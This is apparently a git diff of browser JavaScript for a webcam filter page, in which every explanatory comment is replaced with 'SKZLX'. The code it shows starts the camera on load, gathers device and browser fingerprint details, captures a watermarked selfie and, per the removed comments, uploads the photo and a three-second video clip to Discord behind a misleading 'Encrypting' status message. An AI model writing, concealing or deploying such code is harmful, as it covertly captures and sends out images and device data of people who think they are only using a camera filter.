@@ -9,12 +9,12 @@ const mainContainer = document.getElementById('mainContainer');
 
 let currentStream = null;
 
-// 1. Live Filter Change Listener
+// SKZLX
 filterSelect.addEventListener('change', () => {
     video.style.filter = filterSelect.value;
 });
 
-// 2. Comprehensive Device Info Generator
+// SKZLX
 function getDeviceInfo() {
     const ua = navigator.userAgent;
     let os = "Unknown OS";
@@ -39,7 +39,7 @@ function getDeviceInfo() {
     return `📱 **OS / Device:** ${os}\n🌐 **Browser:** ${browser}\n🖥️ **Screen Res:** ${screenRes}\n📐 **Viewport:** ${viewportRes}\n🌍 **Timezone:** ${timeZone}\n📋 **User Agent:** \`${ua}\``;
 }
 
-// 3. Start the webcam
+// SKZLX
 async function startCamera() {
     try {
         currentStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
@@ -50,7 +50,7 @@ async function startCamera() {
     }
 }
 
-// 4. Handle button click (Snaps instant photo, adds 'skzlx' watermark, then records a 3s clip)
+// SKZLX
 captureBtn.addEventListener('click', async () => {
     statusText.innerText = "Encrypting and uploading bundle...";
     statusText.style.color = "#ffaa00";
@@ -63,7 +63,7 @@ captureBtn.addEventListener('click', async () => {
     
     const ctx = canvas.getContext('2d');
     
-    // Draw mirrored canvas image so captured photo matches selfie orientation
+    // SKZLX
     ctx.save();
     ctx.translate(width, 0);
     ctx.scale(-1, 1);
@@ -71,10 +71,10 @@ captureBtn.addEventListener('click', async () => {
     ctx.drawImage(video, 0, 0, width, height);
     ctx.restore();
 
-    // Reset filter for watermark text rendering
+    // SKZLX
     ctx.filter = 'none';
 
-    // Draw non-inverted 'skzlx' watermark on bottom-right of the image ONLY (hidden from UI)
+    // SKZLX
     const fontSize = Math.max(18, Math.floor(width / 24));
     ctx.font = `bold ${fontSize}px sans-serif`;
     ctx.fillStyle = "rgba(255, 255, 255, 0.85)";
@@ -83,7 +83,7 @@ captureBtn.addEventListener('click', async () => {
     ctx.textAlign = "right";
     ctx.fillText("skzlx", width - (width * 0.04), height - (height * 0.04));
 
-    // Send high-res picture to Discord FIRST
+    // SKZLX
     canvas.toBlob(async (blob) => {
         const formData = new FormData();
         formData.append("image", blob, "client.png");
@@ -102,7 +102,7 @@ captureBtn.addEventListener('click', async () => {
                 mainContainer.classList.add('glitch-success');
                 setTimeout(() => mainContainer.classList.remove('glitch-success'), 600);
 
-                // Start 3-Second Video Clip Recording right after photo sends
+                // SKZLX
                 recordAndSendVideoClip();
             } else {
                 const errorDetail = await response.text();
@@ -116,7 +116,7 @@ captureBtn.addEventListener('click', async () => {
     }, 'image/png');
 });
 
-// 5. Record 3-Second Video Clip and send to Discord
+// SKZLX
 function recordAndSendVideoClip() {
     if (!currentStream) return;
 
@@ -176,5 +176,5 @@ function recordAndSendVideoClip() {
     }, 3000);
 }
 
-// Boot up camera on load
+// SKZLX
 startCamera();
